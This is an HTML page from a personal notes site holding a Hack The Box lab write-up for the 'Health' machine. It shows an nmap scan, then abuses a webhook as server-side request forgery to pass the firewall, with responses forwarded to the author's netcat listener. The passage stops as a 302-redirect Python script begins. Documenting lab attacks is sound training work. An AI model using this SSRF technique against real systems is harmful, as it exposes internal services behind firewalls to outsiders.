@@ -1,0 +1,852 @@
+<!doctype html>
+<html class="no-js" lang="en" data-content_root="">
+  <head><meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-2TCTE0JE23');
+    </script>
+        <link href="../../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../../genindex.html" /><link rel="search" title="Search" href="../../../../search.html" /><link rel="next" title="Jupiter" href="../jupiter/jupiter.html" /><link rel="prev" title="Format" href="../format/format.html" />
+
+    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
+        <title>Health - blnkn&#39;s notes</title>
+      <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=a746c00c" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo.css?v=135e06be" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo-extensions.css?v=36a5483c" />
+    
+    
+
+
+<style>
+  body {
+    --color-code-background: #f8f8f8;
+  --color-code-foreground: black;
+  
+  }
+  @media not print {
+    body[data-theme="dark"] {
+      --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+    }
+    @media (prefers-color-scheme: dark) {
+      body:not([data-theme="light"]) {
+        --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+      }
+    }
+  }
+</style></head>
+  <body>
+    
+    <script>
+      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
+    </script>
+    
+
+<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+  <symbol id="svg-toc" viewBox="0 0 24 24">
+    <title>Contents</title>
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
+      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
+    </svg>
+  </symbol>
+  <symbol id="svg-menu" viewBox="0 0 24 24">
+    <title>Menu</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
+      <line x1="3" y1="12" x2="21" y2="12"></line>
+      <line x1="3" y1="6" x2="21" y2="6"></line>
+      <line x1="3" y1="18" x2="21" y2="18"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
+    <title>Expand</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
+      <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+  </symbol>
+  <symbol id="svg-sun" viewBox="0 0 24 24">
+    <title>Light mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
+      <circle cx="12" cy="12" r="5"></circle>
+      <line x1="12" y1="1" x2="12" y2="3"></line>
+      <line x1="12" y1="21" x2="12" y2="23"></line>
+      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+      <line x1="1" y1="12" x2="3" y2="12"></line>
+      <line x1="21" y1="12" x2="23" y2="12"></line>
+      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-moon" viewBox="0 0 24 24">
+    <title>Dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
+    </svg>
+  </symbol>
+  <symbol id="svg-sun-half" viewBox="0 0 24 24">
+    <title>Auto light/dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+      <circle cx="12" cy="12" r="9" />
+      <path d="M13 12h5" />
+      <path d="M13 15h4" />
+      <path d="M13 18h1" />
+      <path d="M13 9h4" />
+      <path d="M13 6h1" />
+    </svg>
+  </symbol>
+</svg>
+
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
+<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
+<label class="overlay sidebar-overlay" for="__navigation">
+  <div class="visually-hidden">Hide navigation sidebar</div>
+</label>
+<label class="overlay toc-overlay" for="__toc">
+  <div class="visually-hidden">Hide table of contents sidebar</div>
+</label>
+
+
+
+<div class="page">
+  <header class="mobile-header">
+    <div class="header-left">
+      <label class="nav-overlay-icon" for="__navigation">
+        <div class="visually-hidden">Toggle site navigation sidebar</div>
+        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
+      </label>
+    </div>
+    <div class="header-center">
+      <a href="../../../../index.html"><div class="brand">blnkn's notes</div></a>
+    </div>
+    <div class="header-right">
+      <div class="theme-toggle-container theme-toggle-header">
+        <button class="theme-toggle">
+          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+        </button>
+      </div>
+      <label class="toc-overlay-icon toc-header-icon" for="__toc">
+        <div class="visually-hidden">Toggle table of contents sidebar</div>
+        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+      </label>
+    </div>
+  </header>
+  <aside class="sidebar-drawer">
+    <div class="sidebar-container">
+      
+      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../../index.html">
+  
+  <div class="sidebar-logo-container">
+    <img class="sidebar-logo" src="../../../../_static/lazer_fox.png" alt="Logo"/>
+  </div>
+  
+  <span class="sidebar-brand-text">blnkn's notes</span>
+  
+</a><form class="sidebar-search-container" method="get" action="../../../../search.html" role="search">
+  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
+  <input type="hidden" name="check_keywords" value="yes">
+  <input type="hidden" name="area" value="default">
+</form>
+<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
+  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1 current has-children"><a class="reference internal" href="../../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html">Active Directory</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/hashcat/hashcat.html">Hashcat</a></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/sqli/sqli.html">SQLi</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/webapp/webapp.html">Web Apps</a></li>
+</ul>
+</li>
+<li class="toctree-l2 current has-children"><a class="reference internal" href="../../machines.html">Lab Machines</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../hard/snoopy/snoopy.html">Snoopy</a></li>
+</ul>
+</li>
+<li class="toctree-l3 current has-children"><a class="reference internal" href="../medium.html">Medium</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l4"><a class="reference internal" href="../ambassador/ambassador.html">Ambassador</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../authority/authority.html">Authority</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../awkward/awkward.html">Awkward</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../faculty/faculty.html">Faculty</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../forgot/forgot.html">Forgot</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../format/format.html">Format</a></li>
+<li class="toctree-l4 current current-page"><a class="current reference internal" href="#">Health</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../jupiter/jupiter.html">Jupiter</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../manager/manager.html">Manager</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../mentor/mentor.html">Mentor</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../only4you/only4you.html">Only4you</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../outdated/outdated.html">Outdated</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../sandworm/sandworm.html">Sandworm</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../scrambled/scrambled.html">Scrambled</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../shared/shared.html">Shared</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../updown/updown.html">Updown</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../zipping/zipping.html">Zipping</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../easy/easy.html">Easy</a><input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/analytics/analytics.html">Analytics</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/busqueda/busqueda.html">Busqueda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/codify/codify.html">Codify</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/inject/inject.html">Inject</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/keeper/keeper.html">Keeper</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/metatwo/metatwo.html">Meta two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/monitorstwo/monitorstwo.html">Monitors two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pc/pc.html">Pc</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/photobomb/photobomb.html">Photobomb</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pilgrimage/pilgrimage.html">Pilgrimage</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/precious/precious.html">Precious</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/red_panda/red_panda.html">Red panda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/sau/sau.html">Sau</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/shoppy/shoppy.html">Shoppy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/soccer/soccer.html">Soccer</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/stocker/stocker.html">Stocker</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/support/support.html">Support</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/topology/topology.html">Topology</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/trick/trick.html">Trick</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/assembly/assembly.html">Assembly</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/2-technology.html">Technologies</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/codebashing/codebashing.html">Codebashing</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dba/dba.html">Database Administration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/empire/empire.html">Empire</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/hashes/hashes.html">Hashes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/irssi/irssi.html">Irssi</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/nmap/nmap.html">Nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/rfid/rfid.html">RFID</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/shells/shells.html">Reverse Shells</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/stego/stego.html">Steganography</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/c/execution-methods.html">C Execution methods</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
+</ul>
+</li>
+</ul>
+
+</div>
+</div>
+
+      </div>
+      
+    </div>
+  </aside>
+  <div class="main">
+    <div class="content">
+      <div class="article-container">
+        <a href="#" class="back-to-top muted-link">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
+          </svg>
+          <span>Back to top</span>
+        </a>
+        <div class="content-icon-container">
+          
+<div class="theme-toggle-container theme-toggle-content">
+            <button class="theme-toggle">
+              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+            </button>
+          </div>
+          <label class="toc-overlay-icon toc-content-icon" for="__toc">
+            <div class="visually-hidden">Toggle table of contents sidebar</div>
+            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+          </label>
+        </div>
+        <article role="main">
+          <p><img alt="health.png" src="../../../../_images/health.png" /></p>
+<section id="health">
+<h1>Health<a class="headerlink" href="#health" title="Permalink to this heading">#</a></h1>
+<section id="enumeration">
+<h2>Enumeration<a class="headerlink" href="#enumeration" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>nmap.second
+<span class="c1"># Nmap 7.92 scan initiated Wed Sep 14 20:11:46 2022 as: nmap -sV -Pn -sC -oN scans/nmap.second 10.10.11.176</span>
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>health.htb<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.11.176<span class="o">)</span>
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.025s<span class="w"> </span>latency<span class="o">)</span>.
+Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">997</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>conn-refused<span class="o">)</span>
+PORT<span class="w">     </span>STATE<span class="w">    </span>SERVICE<span class="w"> </span>VERSION
+<span class="m">22</span>/tcp<span class="w">   </span>open<span class="w">     </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">7</span>.6p1<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu0.7<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssh-hostkey:
+<span class="p">|</span><span class="w">   </span><span class="m">2048</span><span class="w"> </span><span class="m">32</span>:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span><span class="m">86</span>:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+<span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">     </span>http<span class="w">    </span>Apache<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.4.29<span class="w"> </span><span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span>_http-title:<span class="w"> </span>HTTP<span class="w"> </span>Monitoring<span class="w"> </span>Tool
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Apache/2.4.29<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="m">3000</span>/tcp<span class="w"> </span>filtered<span class="w"> </span>ppp
+Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
+
+Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
+<span class="c1"># Nmap done at Wed Sep 14 20:11:55 2022 -- 1 IP address (1 host up) scanned in 9.16 seconds</span>
+</pre></div>
+</div>
+<blockquote>
+<div><p>Note that there is a filtered service running on 3000, meaning it’s behind the firewall</p>
+</div></blockquote>
+</section>
+<section id="leveraging-the-webhooks-to-do-some-ssrf">
+<h2>Leveraging the Webhooks to do some SSRF<a class="headerlink" href="#leveraging-the-webhooks-to-do-some-ssrf" title="Permalink to this heading">#</a></h2>
+<p>the site has a webhook functionnality, what it does is, it probes a “monitored” URL on a cron schedule, and returns the data from that url to another address which is called the “payload”.<br />
+Because this is done from the webserver’s perspective, of course that sounds like a great way to circumvent the firewall and reach that 3000 port.<br />
+<img alt="hook_not_allowed.png" src="../../../../_images/hook_not_allowed.png" /></p>
+<p>Unfortunately trying to monitor 3000 on the same host does not work, but we can reach out and “monitor” our own address and get the result on another port, e.g. having a webserver on 8000 and a netcat listener on 9000, and we would receive the result of a get from health.htb to ourselved on 8000:
+<img alt="hook_allowed.png" src="../../../../_images/hook_allowed.png" /></p>
+<p>from our side this looks like this:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>-m<span class="w"> </span>http.server
+Serving<span class="w"> </span>HTTP<span class="w"> </span>on<span class="w"> </span><span class="m">0</span>.0.0.0<span class="w"> </span>port<span class="w"> </span><span class="m">8000</span><span class="w"> </span><span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span><span class="w"> </span>...
+<span class="m">10</span>.10.11.176<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">17</span>/Sep/2022<span class="w"> </span><span class="m">17</span>:30:39<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET / HTTP/1.0&quot;</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="w"> </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">9000</span><span class="w">                                                                   </span><span class="m">1</span><span class="w"> </span>⨯
+listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">9000</span><span class="w"> </span>...
+connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">10</span>.10.14.166<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">10</span>.10.11.176<span class="o">]</span><span class="w"> </span><span class="m">33826</span>
+POST<span class="w"> </span>/<span class="w"> </span>HTTP/1.1
+Host:<span class="w"> </span><span class="m">10</span>.10.14.166:9000
+Accept:<span class="w"> </span>*/*
+Content-type:<span class="w"> </span>application/json
+Content-Length:<span class="w"> </span><span class="m">638</span>
+
+<span class="o">{</span><span class="s2">&quot;webhookUrl&quot;</span>:<span class="s2">&quot;http:\/\/10.10.14.166:9000&quot;</span>,<span class="s2">&quot;monitoredUrl&quot;</span>:<span class="s2">&quot;http:\/\/10.10.14.166:8000&quot;</span>,<span class="s2">&quot;health&quot;</span>:<span class="s2">&quot;up&quot;</span>,<span class="s2">&quot;body&quot;</span>:<span class="s2">&quot;&lt;!DOCTYPE HTML PUBLIC \&quot;-\/\/W3C\/\/DTD HTML 4.01\/\/EN\&quot; \&quot;http:\/\/www.w3.org\/TR\/html4\/strict.dtd\&quot;&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text\/html; charset=utf-8\&quot;&gt;\n&lt;title&gt;Directory listing for \/&lt;\/title&gt;\n&lt;\/head&gt;\n&lt;body&gt;\n&lt;h1&gt;Directory listing for \/&lt;\/h1&gt;\n&lt;hr&gt;\n&lt;ul&gt;\n&lt;\/ul&gt;\n&lt;hr&gt;\n&lt;\/body&gt;\n&lt;\/html&gt;\n&quot;</span>,<span class="s2">&quot;message&quot;</span>:<span class="s2">&quot;HTTP\/1.0 200 OK&quot;</span>,<span class="s2">&quot;headers&quot;</span>:<span class="o">{</span><span class="s2">&quot;Server&quot;</span>:<span class="s2">&quot;SimpleHTTP\/0.6 Python\/3.10.0&quot;</span>,<span class="s2">&quot;Date&quot;</span>:<span class="s2">&quot;Sat, 17 Sep 2022 16:30:39 GMT&quot;</span>,<span class="s2">&quot;Content-type&quot;</span>:<span class="s2">&quot;text\/html; charset=utf-8&quot;</span>,<span class="s2">&quot;Content-Length&quot;</span>:<span class="s2">&quot;297&quot;</span><span class="o">}}</span>
+</pre></div>
+</div>
+</section>
+<section id="redirect-the-ssrf">
+<h2>302 Redirect the SSRF<a class="headerlink" href="#redirect-the-ssrf" title="Permalink to this heading">#</a></h2>
+<p>Let’s see what happens if we make our server responds 302 on GET to our local port 8000 and send the server back to his own port 3000, since that’s what we’re interested in. Since the request still comes from the server this should work.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">sys</span>
